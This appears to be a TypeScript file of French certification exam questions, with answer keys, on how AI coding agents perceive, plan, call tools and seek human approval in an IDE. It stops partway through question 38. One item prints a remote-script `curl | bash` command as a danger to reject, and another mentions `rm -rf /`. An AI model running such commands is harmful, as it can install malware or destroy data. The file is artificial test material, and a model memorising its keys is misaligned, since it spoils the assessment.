import { ExamMetadata, ExamQuestion } from './types';

export const PROMPT_ENGINEERING_MODULE_4_EXAM_METADATA: ExamMetadata = {
  moduleId: 'prompt-engineering-module-4',
  title: "Examen Officiel de Certification — Module 4 : Fonctionnement des Agents IA dans Google Antigravity & les IDE",
  durationMinutes: 40,
  passingScorePercent: 80,
  totalQuestions: 40,
};

export const PROMPT_ENGINEERING_MODULE_4_QUESTIONS: ExamQuestion[] = [
  // -------------------------------------------------------------
  // SECTION 1 : Chatbot vs Agent & Architecture en Boucle (Q1-Q6)
  // -------------------------------------------------------------
  {
    id: 1,
    question: "Quelle est la différence fondamentale entre un simple Chatbot conversationnel et un 'Agent IA' opérant dans un IDE tel que Google Antigravity ?",
    options: [
      { letter: 'A', text: "Le chatbot s'exécute sur le cloud, alors que l'agent nécessite obligatoirement un ordinateur quantique." },
      { letter: 'B', text: "Le chatbot se limite à répondre par du texte passif, tandis que l'agent perçoit son environnement de développement, planifie des tâches, appelle des outils pour modifier le code et inspecte le résultat de ses actions en boucle fermée." },
      { letter: 'C', text: "Le chatbot ne parle qu'anglais, tandis que l'agent parle toutes les langues." },
      { letter: 'D', text: "Il n'y a aucune différence technique, ce sont deux termes marketing synonymes." },
    ],
    correctAnswers: ['B'],
    explanation: "Un agent d'IDE est caractérisé par sa capacité d'action autonome outillée : il lit l'environnement, prend des décisions, invoque des fonctions (tools), manipule des fichiers et évalue le résultat réel de ses actions.",
  },
  {
    id: 2,
    question: "Quelles sont les 4 phases canoniques de la boucle de fonctionnement (Agentic Loop) d'un agent de développement ?",
    options: [
      { letter: 'A', text: "1. Compiler, 2. Minifier, 3. Chiffrer, 4. Déployer." },
      { letter: 'B', text: "1. Percevoir (observer l'environnement et la consigne), 2. Raisonner/Planifier, 3. Agir (invoquer un outil), 4. Évaluer/Vérifier (analyser le feedback d'exécution)." },
      { letter: 'C', text: "1. Télécharger, 2. Dézipper, 3. Installer, 4. Supprimer." },
      { letter: 'D', text: "1. Ouvrir le chat, 2. Dire bonjour, 3. Attendre 10 secondes, 4. Fermer la fenêtre." },
    ],
    correctAnswers: ['B'],
    explanation: "La boucle agentique classique (Observe-Orient-Decide-Act ou Perceive-Plan-Act-Evaluate) permet à l'agent d'adapter ses décisions pas à pas en fonction du retour concret des outils exécutés.",
  },
  {
    id: 3,
    codeSnippet: `// Trace d'exécution d'un agent :
Tour 1 : L'agent appelle read_file("package.json")
Tour 2 : L'agent reçoit le contenu et appelle edit_file("src/auth.ts")
Tour 3 : L'agent appelle run_command("npm test")
Tour 4 : Les tests réussissent -> L'agent rédige sa synthèse pour l'utilisateur.`,
    question: "Dans cette trace, comment qualifie-t-on la mécanique qui permet à l'agent de décider de l'action du Tour 3 à partir du résultat du Tour 2 ?",
    options: [
      { letter: 'A', text: "La rétroaction séquentielle d'outils (Tool Calling Feedback Loop)." },
      { letter: 'B', text: "Une surcharge de mémoire vive non gérée." },
      { letter: 'C', text: "Une attaque de l'homme du milieu (Man in the Middle)." },
      { letter: 'D', text: "Une boucle infinie bloquante de JavaScript." },
    ],
    correctAnswers: ['A'],
    explanation: "L'agent examine la sortie de chaque outil exécuté (Tool Output) pour déterminer intelligemment la prochaine étape à enclencher jusqu'à l'atteinte de la condition d'arrêt.",
  },
  {
    id: 4,
    question: "Quelle condition doit impérativement être satisfaite pour que l'agent mette fin à sa boucle de travail autonome ?",
    options: [
      { letter: 'A', text: "L'ordinateur de l'utilisateur doit être éteint." },
      { letter: 'B', text: "L'objectif défini a été validé par les critères d'arrêt ou une limite de sécurité (nombre de tours max, budget de tokens ou refus explicite) a été atteinte." },
      { letter: 'C', text: "Le fichier package.json doit être supprimé." },
      { letter: 'D', text: "Tous les fichiers du projet doivent avoir été modifiés." },
    ],
    correctAnswers: ['B'],
    explanation: "La boucle s'interrompt soit par succès avéré (livrable achevé et vérifié), soit par déclenchement d'un garde-fou (seuil maximal d'itérations, épuisement de quota, blocage nécessitant l'humain).",
  },
  {
    id: 5,
    question: "Que se passe-t-il si un agent d'IDE ne possède aucun mécanisme de limitation d'itérations (Max Turns) ?",
    options: [
      { letter: 'A', text: "Le code source devient automatiquement parfait." },
      { letter: 'B', text: "Il risque de s'enfermer dans une boucle infinie d'appels d'outils en cas d'erreur persistante, consommant des milliers de dollars d'API ou bloquant l'IDE." },
      { letter: 'C', text: "Le projet Git est instantanément publié sur GitHub." },
      { letter: 'D', text: "L'écran s'éteint pour économiser l'énergie." },
    ],
    correctAnswers: ['B'],
    explanation: "Sans garde-fou de récursion ou plafond d'itérations, un échec récurrent (ex: un test qui ne passe jamais) peut piéger l'agent dans une boucle infinie de réessais stériles.",
  },
  {
    id: 6,
    question: "Dans l'architecture d'un agent sous Antigravity, quel composant joue le rôle de 'Moteur Cognitif' ?",
    options: [
      { letter: 'A', text: "La carte réseau Wi-Fi." },
      { letter: 'B', text: "Le Grand Modèle de Langage (LLM, ex: Gemini Pro / Flash) qui analyse le contexte, génère le raisonnement et choisit les arguments des outils." },
      { letter: 'C', text: "Le système de ventilation du boîtier PC." },
      { letter: 'D', text: "Le BIOS de la carte mère." },
    ],
    correctAnswers: ['B'],
    explanation: "Le LLM est le cerveau décisionnel de l'agent : c'est lui qui interprète les consignes, traite les observations et formule les intentions d'appels de fonctions (Tool Calls).",
  },

  // -------------------------------------------------------------
  // SECTION 2 : Perception & Contexte du Projet (Q7-Q12)
  // -------------------------------------------------------------
  {
    id: 7,
    question: "Comment l'agent IA d'Antigravity appréhende-t-il la structure d'un nouveau projet qui lui est confié ?",
    options: [
      { letter: 'A', text: "En lisant au hasard 3 images JPG présentes sur le bureau." },
      { letter: 'B', text: "En explorant l'arborescence des fichiers, en inspectant les descripteurs de projet (package.json, tsconfig.json), les fichiers de règles (.agent/rules, AGENTS.md) et les index de code." },
      { letter: 'C', text: "En exécutant un scan réseau complet de tous les ordinateurs connectés au Wi-Fi." },
      { letter: 'D', text: "En supprimant le dossier .git pour voir ce qui se passe." },
    ],
    correctAnswers: ['B'],
    explanation: "La phase d'orientation initiale repose sur l'inspection de l'arborescence, des configurations de compilation et des règles de gouvernance pour cartographier le projet sans rien inventer.",
  },
  {
    id: 8,
    codeSnippet: `// Commande interne exécutée par l'agent :
list_directory({ path: "src/services" })
read_file({ path: "src/services/payment.service.ts", startLine: 1, endLine: 80 })`,
    question: "Pourquoi l'agent lit-il souvent un fichier par plages de lignes (startLine / endLine) au lieu de charger tout le fichier d'un coup ?",
    options: [
      { letter: 'A', text: "Pour économiser la fenêtre de contexte et cibler précisément la région de code concernée sans saturer sa mémoire de travail." },
      { letter: 'B', text: "Parce que Windows interdit la lecture de fichiers de plus de 100 lignes." },
      { letter: 'C', text: "Pour masquer les bugs présents dans le reste du fichier." },
      { letter: 'D', text: "Parce que les lignes impaires sont réservées au système d'exploitation." },
    ],
    correctAnswers: ['A'],
    explanation: "La lecture fenêtrée préserve les tokens de la fenêtre de contexte et évite la dilution d'attention, permettant à l'agent de se focaliser sur le bloc logique d'intérêt.",
  },
  {
    id: 9,
    question: "Quel rôle jouent les fichiers de configuration de l'IDE (`.gemini/`, `.agent/`, `AGENTS.md`) dans la perception de l'agent ?",
    options: [
      { letter: 'A', text: "Ils servent de papier peint pour l'arrière-plan du chat." },
      { letter: 'B', text: "Ils sont prioritaires et injectés d'office pour définir les contraintes architecturales et les conventions de code que l'agent doit observer." },
      { letter: 'C', text: "Ils désactivent la connexion au terminal." },
      { letter: 'D', text: "Ils empêchent l'agent d'utiliser le langage TypeScript." },
    ],
    correctAnswers: ['B'],
    explanation: "Ces fichiers agissent comme des lunettes de perception normatives : ils dictent à l'agent les règles du projet avant même qu'il ne lise la première ligne de code.",
  },
  {
    id: 10,
    question: "Qu'est-ce que l'indexation sémantique (Embeddings / AST Index) d'un projet dans un IDE moderne ?",
    options: [
      { letter: 'A', text: "Un outil pour compter le nombre de caractères dans chaque variable." },
      { letter: 'B', text: "Une base vectorielle et syntaxique permettant à l'agent de retrouver instantanément les déclarations de fonctions, types et dépendances pertinents à travers tout le codebase sans tout relire manuellement." },
      { letter: 'C', text: "Un logiciel espion qui surveille les frappes clavier de l'utilisateur." },
      { letter: 'D', text: "Un script qui traduit le code JavaScript en PHP." },
    ],
    correctAnswers: ['B'],
    explanation: "L'indexation permet la recherche sémantique (RAG de codebase) : l'agent localise en quelques millisecondes les fichiers pertinents pour répondre à une question ou implémenter une fonctionnalité.",
  },
  {
    id: 11,
    codeSnippet: `Fichier : .gitignore
Contenu :
node_modules/
dist/
.env
*.log`,
    question: "Comment un agent d'IDE bien conçu traite-t-il les fichiers et répertoires déclarés dans le `.gitignore` ?",
    options: [
      { letter: 'A', text: "Il les publie immédiatement sur un serveur public." },
      { letter: 'B', text: "Il les exclut par défaut de ses scans d'exploration et de recherche pour éviter de saturer son contexte avec des artefacts compilés ou de lire des secrets." },
      { letter: 'C', text: "Il supprime définitivement le fichier .gitignore." },
      { letter: 'D', text: "Il refuse d'éditer le moindre fichier du projet." },
    ],
    correctAnswers: ['B'],
    explanation: "Respecter le `.gitignore` évite d'indexer des millions de lignes inutiles dans `node_modules` ou `dist` et protège les fichiers sensibles de configuration locale.",
  },
  {
    id: 12,
    question: "Si l'agent ignore quel framework CSS est installé sur le projet, quelle action de perception doit-il engager en premier lieu ?",
    options: [
      { letter: 'A', text: "Demander immédiatement à l'utilisateur sans chercher." },
      { letter: 'B', text: "Lire le fichier `package.json` à la racine pour inspecter les `dependencies` et `devDependencies` (ex: présence de tailwindcss ou bootstrap)." },
      { letter: 'C', text: "Installer Bootstrap par défaut dans le projet." },
      { letter: 'D', text: "Supprimer tous les fichiers `.css` existants." },
    ],
    correctAnswers: ['B'],
    explanation: "L'autonomie professionnelle exige que l'agent consulte d'abord les sources factuelles à sa disposition (`package.json`) avant de solliciter l'utilisateur pour une information vérifiable en un clic.",
  },

  // -------------------------------------------------------------
  // SECTION 3 : Planification des Tâches & Décomposition (Q13-Q18)
  // -------------------------------------------------------------
  {
    id: 13,
    question: "Pourquoi la phase de planification (Task Planning) est-elle essentielle avant toute exécution de modifications complexes par l'agent ?",
    options: [
      { letter: 'A', text: "Parce qu'elle empêche l'agent d'agir de façon impulsive, découpe la tâche en jalons ordonnés et permet une reprise sur erreur étape par étape." },
      { letter: 'B', text: "Pour afficher un compte à rebours de 10 minutes sur l'écran." },
      { letter: 'C', text: "Parce que les serveurs cloud refusent les requêtes sans plan au format XML." },
      { letter: 'D', text: "Pour obliger l'utilisateur à payer un supplément de licence." },
    ],
    correctAnswers: ['A'],
    explanation: "La planification structure la trajectoire d'exécution. Elle évite les modifications désordonnées et offre un fil conducteur stable pour évaluer la progression réelle du travail.",
  },
  {
    id: 14,
    codeSnippet: `Plan de l'agent :
- [x] 1. Inspecter le schéma Prisma existant (prisma/schema.prisma)
- [x] 2. Ajouter le modèle 'AuditLog' avec ses relations
- [ ] 3. Générer et appliquer la migration locale (npx prisma migrate dev)
- [ ] 4. Créer le service AuditService dans src/services/audit.service.ts
- [ ] 5. Écrire les tests unitaires et exécuter npm test`,
    question: "Quel avantage opérationnel majeur cette liste de tâches dynamique (Todo List) offre-t-elle au développeur ?",
    options: [
      { letter: 'A', text: "Le développeur peut visualiser l'état d'avancement exact en temps réel et valider chaque transition d'état." },
      { letter: 'B', text: "Elle supprime le besoin d'exécuter la base de données PostgreSQL." },
      { letter: 'C', text: "Elle convertit les tests unitaires en documentation PDF." },
      { letter: 'D', text: "Elle rend le code open-source automatiquement." },
    ],
    correctAnswers: ['A'],
    explanation: "Le suivi d'état explicite offre une visibilité totale sur l'exécution, rassure le développeur et permet à l'agent de ne jamais perdre le fil en cas d'incident intermédiaire.",
  },
  {
    id: 15,
    question: "Comment un agent avancé doit-il gérer un plan lorsque l'étape 3 échoue de manière inattendue (ex: conflit de migration Prisma) ?",
    options: [
      { letter: 'A', text: "Cocher l'étape 3 comme réussie et passer à l'étape 4 comme si de rien n'était." },
      { letter: 'B', text: "Mettre à jour son plan dynamiquement : marquer l'étape 3 en échec, insérer une sous-tâche de diagnostic/résolution du conflit, et réévaluer la suite." },
      { letter: 'C', text: "Supprimer tout le projet Git pour effacer l'erreur." },
      { letter: 'D', text: "Fermer l'application Antigravity immédiatement." },
    ],
    correctAnswers: ['B'],
    explanation: "La replanification dynamique (Dynamic Replanning) est la marque des agents résilients : ils intègrent l'anomalie dans leur plan de vol, corrigent l'obstacle et reprennent le cap prévu.",
  },
  {
    id: 16,
    question: "Quelle différence distingue une planification 'linéaire' d'une planification 'arborescente' (Tree of Thoughts) dans la réflexion d'un agent ?",
    options: [
      { letter: 'A', text: "La planification linéaire ne fonctionne que sur les ordinateurs portables." },
      { letter: 'B', text: "La planification linéaire enchaîne les étapes de façon séquentielle sans alternative, tandis que l'approche arborescente explore plusieurs hypothèses architecturales concurrentes, évalue leurs compromis et retient la meilleure." },
      { letter: 'C', text: "L'arborescente nécessite de planter des arbres dans le jardin." },
      { letter: 'D', text: "La planification linéaire est interdite en TypeScript." },
    ],
    correctAnswers: ['B'],
    explanation: "L'approche Tree of Thoughts permet d'envisager plusieurs voies de conception en parallèle (ex: approche par trigger SQL vs middleware applicatif), de peser les pour et contre avant de trancher.",
  },
  {
    id: 17,
    codeSnippet: `Consigne utilisateur :
"Répare le bug de déconnexion intempestive des utilisateurs sur mobile."`,
    question: "Dans le cadre de la planification, quelle est la première étape obligatoire que l'agent doit planifier avant de toucher au code ?",
    options: [
      { letter: 'A', text: "Supprimer le module d'authentification pour repartir de zéro." },
      { letter: 'B', text: "Reproduire ou localiser la cause racine du bug (analyse des logs, de la durée de vie du cookie/token JWT et du User-Agent) pour poser un diagnostic certain." },
      { letter: 'C', text: "Changer la couleur du bouton de déconnexion en rouge." },
      { letter: 'D', text: "Envoyer un message à tous les utilisateurs enregistrés." },
    ],
    correctAnswers: ['B'],
    explanation: "On ne traite pas un symptôme à l'aveugle. La démarche d'ingénierie impose de reproduire et d'isoler la cause racine avant d'envisager la moindre modification du code existant.",
  },
  {
    id: 18,
    question: "Quel risque survient si un agent décompose un plan en 50 micro-étapes excessivement granulaires (ex: 'étape 1 : ouvrir le fichier, étape 2 : lire la ligne 1, étape 3 : lire la ligne 2...') ?",
    options: [
      { letter: 'A', text: "Une surconsommation massive de tokens et une explosion du temps de latence sans aucune plus-value d'ingénierie." },
      { letter: 'B', text: "Une amende infligée par l'organisme de standardisation W3C." },
      { letter: 'C', text: "L'effacement automatique des polices de caractères." },
      { letter: 'D', text: "Une amélioration exponentielle de la mémoire cache." },
    ],
    correctAnswers: ['A'],
    explanation: "Une sur-granularité étouffe l'agent sous des micro-décisions inutiles, gaspille le budget d'inférence et ralentit considérablement la réalisation de la tâche.",
  },

  // -------------------------------------------------------------
  // SECTION 4 : Utilisation des Outils & Manipulation des Fichiers (Q19-Q26)
  // -------------------------------------------------------------
  {
    id: 19,
    question: "Comment fonctionne techniquement l'invocation d'un outil (Tool / Function Calling) par le LLM dans Antigravity ?",
    options: [
      { letter: 'A', text: "Le LLM prend le contrôle physique de la souris et clique sur les menus de l'écran." },
      { letter: 'B', text: "Le LLM émet une réponse structurée contenant le nom de la fonction et ses arguments JSON typés ; l'environnement hôte intercepte cette intention, exécute la fonction réelle et réinjecte le résultat au LLM." },
      { letter: 'C', text: "L'outil est compilé en assembleur et envoyé par email au support Google." },
      { letter: 'D', text: "Le LLM génère du code HTML qui s'affiche dans une iframe cachée." },
    ],
    correctAnswers: ['B'],
    explanation: "Le modèle ne 'touche' jamais directement au disque ou au système. Il exprime une intention formelle (Tool Call JSON). C'est le runtime sécurisé de l'IDE qui valide, exécute la fonction et lui renvoie la sortie.",
  },
  {
    id: 20,
    codeSnippet: `// Appel d'outil généré par l'agent :
edit_file({
  path: "src/utils/calculator.ts",
  target: "return a + b;",
  replacement: "if (typeof a !== 'number' || typeof b !== 'number') throw new TypeError('Arguments invalides');\\n  return a + b;"
})`,
    question: "Pourquoi l'outil `edit_file` avec ciblage exact (target / replacement) est-il généralement préféré à `write_file` pour des modifications ponctuelles ?",
    options: [
      { letter: 'A', text: "Parce que write_file écrase l'intégralité du fichier, risquant de supprimer par inadvertance des centaines de lignes non concernées, alors qu'edit_file applique une retouche chirurgicale ciblée." },
      { letter: 'B', text: "Parce que write_file est réservé aux administrateurs système sous Linux." },
      { letter: 'C', text: "Parce qu'edit_file ne consomme aucun token." },
      { letter: 'D', text: "Parce que write_file ne fonctionne pas avec les fichiers TypeScript." },
    ],
    correctAnswers: ['A'],
    explanation: "L'édition chirurgicale (`edit_file`) préserve l'intégrité globale du fichier existant, minimise les risques d'effacement accidentel de code environnant et produit des diffs Git limpides.",
  },
  {
    id: 21,
    question: "Que se passe-t-il si la chaîne `target` fournie à `edit_file` n'existe pas ou contient une faute d'espace par rapport au contenu réel du fichier ?",
    options: [
      { letter: 'A', text: "L'outil modifie un fichier au hasard dans le projet." },
      { letter: 'B', text: "L'outil échoue et renvoie un message d'erreur explicite indiquant que la cible est introuvable, forçant l'agent à relire le fichier pour rectifier sa cible." },
      { letter: 'C', text: "L'ordinateur redémarre instantanément." },
      { letter: 'D', text: "Le texte de remplacement est ajouté à la fin du disque dur." },
    ],
    correctAnswers: ['B'],
    explanation: "La stricte correspondance de chaîne protège contre les éditions erratiques : en cas de non-concordance exacte (espaces, retours à la ligne), l'outil refuse l'opération pour éviter toute corruption.",
  },
  {
    id: 22,
    question: "Quand l'utilisation de `write_file` avec l'option d'écrasement complet (Overwrite: true) est-elle légitime et appropriée ?",
    options: [
      { letter: 'A', text: "Pour créer un nouveau fichier de zéro ou régénérer un fichier d'artefact entièrement produit par l'agent (ex: un nouveau test ou un rapport d'audit)." },
      { letter: 'B', text: "Pour modifier une seule ligne dans package.json." },
      { letter: 'C', text: "Pour effacer le code source avant de quitter l'IDE." },
      { letter: 'D', text: "Uniquement lors du premier commit d'un projet." },
    ],
    correctAnswers: ['A'],
    explanation: "`write_file` est parfait pour l'instanciation de nouveaux composants ou la génération de rapports complets ex-nihilo où aucune logique préexistante ne risque d'être écrasée.",
  },
  {
    id: 23,
    codeSnippet: `// Schéma de définition d'outil (Tool Schema) :
{
  "name": "search_codebase",
  "description": "Recherche textuelle ou regex dans les fichiers du projet.",
  "parameters": {
    "type": "object",
    "properties": {
      "query": { "type": "string", "description": "Chaîne recherchée" },
      "filePattern": { "type": "string", "description": "Filtre glob (ex: *.ts)" }
    },
    "required": ["query"]
  }
}`,
    question: "Pourquoi la qualité de la `description` d'un outil dans son schéma JSON est-elle aussi importante que son code d'implémentation ?",
    options: [
      { letter: 'A', text: "Parce que c'est cette description en langage naturel que le LLM lit pour comprendre QUAND et COMMENT utiliser judicieusement l'outil." },
      { letter: 'B', text: "Elle sert uniquement à décorer l'interface graphique de l'IDE." },
      { letter: 'C', text: "Elle permet de traduire l'outil en Python 2.7." },
      { letter: 'D', text: "Elle n'a aucune importance, le modèle devine les paramètres par télépathie." },
    ],
    correctAnswers: ['A'],
    explanation: "La description de l'outil est l'instruction de l'outil : un texte vague entraîne des invocations inappropriées ou des arguments mal calibrés de la part du modèle.",
  },
  {
    id: 24,
    question: "Quel mécanisme empêche un agent de modifier des fichiers en dehors du répertoire racine de l'espace de travail (Workspace Boundary Check) ?",
    options: [
      { letter: 'A', text: "Un antivirus commercial tiers." },
      { letter: 'B', text: "Le bac à sable (sandboxing) et la validation de chemin canonique (Canonical Path Validation) qui rejettent toute tentative d'échappement par '../' ou chemin absolu hors-projet." },
      { letter: 'C', text: "Le verrouillage physique du boîtier de l'ordinateur." },
      { letter: 'D', text: "L'obligation d'utiliser un écran tactile." },
    ],
    correctAnswers: ['B'],
    explanation: "Le confinement au workspace vérifie que le chemin résolu reste strictement confiné sous la racine autorisée du projet, bloquant les attaques de type Path Traversal.",
  },
  {
    id: 25,
    question: "Comment un agent doit-il gérer la lecture d'un fichier binaire non textuel (ex: une image PNG ou un exécutable .exe) ?",
    options: [
      { letter: 'A', text: "L'afficher en texte brut dans le chat, provoquant des milliers de caractères incohérents." },
      { letter: 'B', text: "Détecter le type MIME, éviter la lecture brute en tant que chaîne de caractères, et exploiter des outils spécialisés de traitement d'image ou de métadonnées s'ils sont disponibles." },
      { letter: 'C', text: "Le renommer en .txt et supprimer les octets pairs." },
      { letter: 'D', text: "Le convertir automatiquement en script bash." },
    ],
    correctAnswers: ['B'],
    explanation: "Tenter d'injecter des données binaires dans la fenêtre de contexte textuelle pollue inutilement la mémoire avec du bruit. Les métadonnées ou les modèles multimodaux dédiés doivent être sollicités.",
  },
  {
    id: 26,
    question: "Lors d'une opération d'édition de fichier, pourquoi est-il recommandé que l'agent vérifie le diff Git ou relise le fichier après modification ?",
    options: [
      { letter: 'A', text: "Pour s'assurer que la retouche s'est insérée exactement au bon endroit sans détruire la structure syntaxique environnante (principe de vérification post-action)." },
      { letter: 'B', text: "Pour envoyer automatiquement un tweet sur X." },
      { letter: 'C', text: "Parce que Git bloque les dépôts non vérifiés." },
      { letter: 'D', text: "Pour augmenter le score de productivité de l'IDE." },
    ],
    correctAnswers: ['A'],
    explanation: "La fermeture de la boucle d'action impose de valider que la modification appliquée correspond fidèlement à l'intention avant d'engager la suite des opérations.",
  },

  // -------------------------------------------------------------
  // SECTION 5 : Utilisation du Terminal & Commandes Système (Q27-Q32)
  // -------------------------------------------------------------
  {
    id: 27,
    question: "Quel danger critique présente l'octroi d'un accès sans restriction au terminal (`run_command`) pour un agent IA autonome ?",
    options: [
      { letter: 'A', text: "L'agent peut exécuter des commandes destructives irréversibles (ex: `rm -rf /`, formatage, écrasement de base de données de production) ou introduire des malwares distants." },
      { letter: 'B', text: "La police du terminal change de couleur sans autorisation." },
      { letter: 'C', text: "Le clavier de l'utilisateur bascule en mode QWERTY." },
      { letter: 'D', text: "La vitesse de téléchargement est bridée à 56k." },
    ],
    correctAnswers: ['A'],
    explanation: "Le shell donne un pouvoir absolu sur le système d'exploitation hôte. Sans surveillance, l'agent peut commettre des erreurs irréparables ou être instrumentalisé par du code malveillant.",
  },
  {
    id: 28,
    codeSnippet: `// Commande proposée par l'agent :
curl -s http://unknown-server.io/setup.sh | bash`,
    question: "Face à cette proposition d'un agent, comment un développeur vigilant doit-il réagir ?",
    options: [
      { letter: 'A', text: "Approuver immédiatement car l'agent sait ce qu'il fait." },
      { letter: 'B', text: "Rejeter formellement la commande : exécuter un script distant non audité directement dans le shell via pipe bash viole toutes les règles de sécurité élémentaires." },
      { letter: 'C', text: "Ajouter 'sudo' devant pour que la commande aille plus vite." },
      { letter: 'D', text: "Débrancher la prise d'alimentation de l'ordinateur." },
    ],
    correctAnswers: ['B'],
    explanation: "L'exécution aveugle de scripts bash distants (`curl | bash`) est un vecteur classique de compromission. Aucun agent ne doit être autorisé à exécuter ce type de commande.",
  },
  {
    id: 29,
    question: "Dans Antigravity, quelle est la distinction technique entre une commande normale et un 'processus démon' (Daemon / Background Task) ?",
    options: [
      { letter: 'A', text: "Une commande normale s'exécute de jour, un démon s'exécute la nuit." },
      { letter: 'B', text: "Une commande normale doit se terminer avec un code de retour (ex: `npm test`), tandis qu'un démon est un processus persistant qui tourne en continu en arrière-plan sans bloquer l'agent (ex: un serveur de dev `next dev`)." },
      { letter: 'C', text: "Un démon est une commande infectée par un virus." },
      { letter: 'D', text: "Une commande normale ne peut pas utiliser de paramètres." },
    ],
    correctAnswers: ['B'],
    explanation: "Les serveurs de développement ou les watchers de fichiers doivent être lancés en mode démon (`IsDaemon: true`) pour ne pas figer l'agent dans une attente synchrone infinie.",
  },
  {
    id: 30,
    codeSnippet: `run_command({
  CommandLine: "npm test",
  WaitMsBeforeAsync: 8000,
  toolSummary: "Exécution de la suite de tests unitaires"
})`,
    question: "À quoi sert le paramètre `WaitMsBeforeAsync` dans cet appel d'outil d'Antigravity ?",
    options: [
      { letter: 'A', text: "Il définit le délai d'attente synchrone maximal avant de basculer la commande en tâche d'arrière-plan si elle prend plus de temps que prévu." },
      { letter: 'B', text: "Il met l'ordinateur en veille pendant 8 secondes." },
      { letter: 'C', text: "Il supprime les logs datant de plus de 8 secondes." },
      { letter: 'D', text: "Il limite la vitesse de calcul du processeur à 8 MHz." },
    ],
    correctAnswers: ['A'],
    explanation: "`WaitMsBeforeAsync` permet à l'agent de récupérer immédiatement la sortie des commandes rapides tout en basculant automatiquement les opérations lentes en arrière-plan sans blocage de l'UI.",
  },
  {
    id: 31,
    question: "Pourquoi est-il primordial d'isoler l'environnement d'exécution du terminal d'un appel à l'autre (chaque commande s'exécute dans une nouvelle session) ?",
    options: [
      { letter: 'A', text: "Pour empêcher les fuites d'état imprévisibles (variables d'environnement non persistées ou changements de répertoire courant fantômes `cd`) qui déstabiliseraient les étapes suivantes." },
      { letter: 'B', text: "Parce que Windows ne supporte qu'une seule commande par jour." },
      { letter: 'C', text: "Pour forcer l'utilisateur à retaper son mot de passe en boucle." },
      { letter: 'D', text: "Pour désactiver la coloration syntaxique du shell." },
    ],
    correctAnswers: ['A'],
    explanation: "L'exécution sans état (stateless) garantit la reproductibilité : chaque commande doit être explicite dans ses chemins et variables sans dépendre d'un `cd` résiduel exécuté au tour précédent.",
  },
  {
    id: 32,
    question: "Comment un agent d'IDE doit-il interpréter un code de retour (Exit Code) égal à 0 après l'exécution d'une commande terminal ?",
    options: [
      { letter: 'A', text: "Comme une erreur critique bloquante." },
      { letter: 'B', text: "Comme un succès standard selon la convention universelle POSIX, indiquant que le processus s'est achevé normalement." },
      { letter: 'C', text: "Comme un signal de redémarrage de la machine." },
      { letter: 'D', text: "Comme une invitation à effacer la mémoire vive." },
    ],
    correctAnswers: ['B'],
    explanation: "Dans les systèmes d'exploitation (Linux, macOS, Windows), un code de retour de 0 signifie l'absence d'erreur (succès). Tout code différent de 0 signale une anomalie ou un échec.",
  },

  // -------------------------------------------------------------
  // SECTION 6 : Validation des Résultats, HITL & Autorisations (Q33-Q37)
  // -------------------------------------------------------------
  {
    id: 33,
    question: "Qu'est-ce qu'un 'Oracle de Vérité' dans le cycle de validation d'un agent de développement ?",
    options: [
      { letter: 'A', text: "Un serveur de voyance consulté par API REST." },
      { letter: 'B', text: "Un outil externe déterministe (compilateur TypeScript, suite de tests unitaires, linter ESLint) dont le verdict binaire (succès ou échec) est irréfutable et ne dépend pas de l'avis du LLM." },
      { letter: 'C', text: "Un développeur qui relit tout le code à la main." },
      { letter: 'D', text: "La documentation officielle du langage C." },
    ],
    correctAnswers: ['B'],
    explanation: "Le LLM peut avoir des hallucinations de complaisance ('Tout est parfait !'). L'oracle de vérité (ex: `tsc --noEmit`) fournit une preuve factuelle et mathématique de validité.",
  },
  {
    id: 34,
    question: "En quoi consiste le paradigme 'Human-in-the-Loop' (HITL) dans le contrôle d'agents sous Google Antigravity ?",
    options: [
      { letter: 'A', text: "Forcer le développeur à écrire tout le code à la place de l'agent." },
      { letter: 'B', text: "Maintenir l'ingénieur humain au centre de la boucle de décision : l'agent propose des plans et prépare des actions, mais les opérations sensibles requièrent le consentement explicite de l'humain." },
      { letter: 'C', text: "Empêcher les humains d'utiliser les ordinateurs." },
      { letter: 'D', text: "Une technique de réalité virtuelle immersive." },
    ],
    correctAnswers: ['B'],
    explanation: "Le modèle HITL combine la vélocité de l'agent et le jugement critique de l'humain. L'humain valide les décisions architecturales et les opérations à fort impact.",
  },
  {
    id: 35,
    codeSnippet: `// Configuration de sécurité d'un agent :
Mode d'exécution : "Ask Before Edits"
Commandes auto-approuvées : ["npm test", "git status", "git diff"]
Commandes soumises à confirmation : ["git push", "rm", "npm install", "docker run"]`,
    question: "Pourquoi cette politique d'autorisation granulaire est-elle considérée comme la meilleure pratique en entreprise ?",
    options: [
      { letter: 'A', text: "Elle offre un équilibre optimal : fluidité maximale pour les opérations de lecture et vérification indolores, et sécurité absolue sur les opérations destructives ou réseau." },
      { letter: 'B', text: "Elle ralentit volontairement le travail pour respecter le temps de repos." },
      { letter: 'C', text: "Elle supprime les licences logicielles payantes." },
      { letter: 'D', text: "Elle empêche les développeurs de faire des commits le vendredi." },
    ],
    correctAnswers: ['A'],
    explanation: "L'autorisation par catégorie libère l'agent sur les tâches anodines (tests, diffs) tout en érigeant une barrière infranchissable sur les actions critiques sans approbation humaine.",
  },
  {
    id: 36,
    question: "Que doit faire un agent lorsque l'utilisateur refuse explicitement une proposition d'action (clic sur 'Reject' ou 'Cancel') ?",
    options: [
      { letter: 'A', text: "Forcer l'exécution quand même en contournant l'interface." },
      { letter: 'B', text: "Prendre acte du refus avec courtoisie, annuler immédiatement l'opération prévue, et solliciter des précisions sur la direction souhaitée par le développeur." },
      { letter: 'C', text: "Quitter le projet et fermer l'ordinateur." },
      { letter: 'D', text: "Supprimer le compte de l'utilisateur." },
    ],
    correctAnswers: ['B'],
    explanation: "Le refus de l'utilisateur est un signal d'arrêt impératif. L'agent doit faire preuve d'adaptabilité, s'abstenir de toute insistance déplacée et demander de nouvelles consignes.",
  },
  {
    id: 37,
    question: "Dans Antigravity, que permet l'utilisation de sous-agents spécialisés (Subagents) créés via `invoke_subagent` ?",
    options: [
      { letter: 'A', text: "Déléguer des sous-tâches isolées (ex: recherche documentaire ou tests) dans un contexte de conversation indépendant sans encombrer la mémoire de travail de l'agent principal." },
      { letter: 'B', text: "Faire planter la carte graphique pour réinitialiser les pilotes." },
      { letter: 'C', text: "Télécharger des jeux vidéo pendant les heures de bureau." },
      { letter: 'D', text: "Chiffrer le disque dur de l'entreprise." },
    ],
    correctAnswers: ['A'],
    explanation: "Les sous-agents permettent la modularisation du travail cognitif : ils accomplissent une tâche exploratoire ciblée et ne renvoient que la synthèse épurée à l'agent parent.",
  },

  // -------------------------------------------------------------
  // SECTION 7 : Projet Pratique Final — Agent Autonome Antigravity (Q38-Q40)
  // -------------------------------------------------------------
  {
    id: 38,
